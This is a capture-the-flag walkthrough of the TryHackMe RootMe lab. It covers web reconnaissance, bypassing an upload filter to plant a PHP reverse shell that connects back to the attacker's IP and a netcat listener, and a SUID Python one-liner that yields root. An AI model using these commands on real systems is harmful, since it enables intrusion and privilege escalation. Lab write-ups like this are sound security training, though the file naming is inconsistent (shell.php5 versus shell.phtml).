# RootMe — TryHackMe Walkthrough

This document provides a complete walkthrough of the RootMe room on TryHackMe. It covers reconnaissance, gaining a shell through a file upload vulnerability, and privilege escalation using a SUID Python binary.

---

## 1. Reconnaissance

### 1.1 Nmap Scan

An initial Nmap scan was performed to enumerate services:

```bash
nmap -sC -sV -oN rootme.nmap 10.10.X.X
Results showed:

Port 80/tcp (HTTP) open

A basic web server running

No additional major services exposed

This indicated the web application was the primary attack surface.

1.2 Directory Enumeration
Directory brute‑forcing was performed to identify hidden paths:

bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt
Findings:

/uploads — directory where uploaded files are stored

/assets — static content

The /uploads directory was important because it allowed direct access to uploaded files.

1.3 Web Application Behavior
Inspection of the upload feature revealed:

.php files were blocked

.phtml files were accepted

Uploaded files were placed directly into /uploads without sanitization

This confirmed the upload feature could be abused to execute server‑side code.

2. Getting a Shell
2.1 Preparing the Reverse Shell
A php5 reverse shell was selected and modified to use the attacker’s TryHackMe VPN IP (tun0):

php
$ip = '10.8.X.X';   // tun0 IP
$port = 4444;       // listener port
The file was saved as: shell.php5

2.2 Uploading the Reverse Shell
The .phtml file bypassed the upload filter and was successfully placed into:

Code
http://10.10.X.X/uploads/shell.phtml
2.3 Catching the Reverse Shell
A netcat listener was started:

bash
nc -lvnp 4444
Triggering the uploaded file resulted in a reverse shell:

Code
connect to [10.8.X.X] from (10.10.X.X)
www-data@rootme:/var/www/html/uploads$
This provided a working shell as the www-data user.

3. Privilege Escalation
3.1 Enumerating SUID Binaries
SUID binaries were enumerated to identify potential privilege escalation vectors:

bash
find / -perm -u=s -type f 2>/dev/null
A notable result was:

Code
/usr/bin/python
A SUID-enabled Python binary is a known privilege escalation method documented on GTFOBins.

3.2 GTFOBins Python Exploit
Using the GTFOBins technique, Python was used to spawn a root shell:

bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
Privilege verification:

bash
whoami
Output:

Code
root
Root access was successfully obtained.

4. Flags
4.1 User Flag
bash
cat /home/USERNAME/user.txt
4.2 Root Flag
bash
cat /root/root.txt
Both flags were retrieved, completing the room.
